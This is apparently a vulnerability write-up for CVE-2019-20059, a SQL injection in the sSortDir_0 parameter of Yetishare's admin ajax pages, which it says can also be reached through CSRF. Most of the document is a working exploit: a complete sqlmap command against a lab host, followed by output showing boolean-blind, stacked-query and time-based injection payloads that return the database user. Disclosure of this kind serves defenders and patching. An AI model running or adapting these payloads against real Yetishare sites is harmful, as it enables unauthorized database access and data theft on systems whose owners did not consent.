# CVE-2019-20059
Yetishare SQL Injection in sSortDir_0 parameter - v3.5.2 - v4.5.4. Apart from an admin being able to exploit this, it could also be used in a CSRF attack to trick an admin user into running malicious queries.

# Files affected
* payment_manage.ajax.php
* payment_subscription_manage.ajax.php
* server_manage.ajax.php

# Example using sqlmap
```
python sqlmap.py -u 'http://192.168.0.62/admin/ajax/payment_manage.ajax.php?languageId=1&sEcho=17&iColumns=5&sColumns=file_icon%2Clanguage_key%2Cenglish_content%2Ctranslated_content%2C&iDisplayStart=0&iDisplayLength=50&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&iSortingCols=1&iSortCol_0=1&sSortDir_0=asc&bSortable_0=false&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=false&filterText=Support' --cookie="filehosting=6r7tecbbbqss2noh359mg0jlm6" --dbms mysql --risk 3 --level 5 -p sSortDir_0 --current-user
```

```
[00:19:10] [INFO] testing connection to the target URL
[00:19:10] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: sSortDir_0 (GET)
    Type: boolean-based blind
    Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
    Payload: languageId=1&sEcho=17&iColumns=5&sColumns=file_icon,language_key,english_content,translated_content,&iDisplayStart=0&iDisplayLength=50&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&iSortingCols=1&iSortCol_0=1&sSortDir_0=asc,(SELECT (CASE WHEN (9452=9452) THEN 1 ELSE 9452*(SELECT 9452 FROM INFORMATION_SCHEMA.PLUGINS) END))&bSortable_0=false&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=false&filterText=Support

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: languageId=1&sEcho=17&iColumns=5&sColumns=file_icon,language_key,english_content,translated_content,&iDisplayStart=0&iDisplayLength=50&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&iSortingCols=1&iSortCol_0=1&sSortDir_0=asc;SELECT SLEEP(5)#&bSortable_0=false&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=false&filterText=Support

    Type: time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: languageId=1&sEcho=17&iColumns=5&sColumns=file_icon,language_key,english_content,translated_content,&iDisplayStart=0&iDisplayLength=50&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&iSortingCols=1&iSortCol_0=1&sSortDir_0=asc PROCEDURE ANALYSE(EXTRACTVALUE(7487,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x7978466b))))),1)#&bSortable_0=false&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=false&filterText=Support
---
[00:19:10] [INFO] testing MySQL
[00:19:10] [INFO] confirming MySQL
[00:19:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[00:19:10] [INFO] fetching current user
[00:19:10] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:19:10] [INFO] retrieved: root@localhost
current user: 'root@localhost'
```
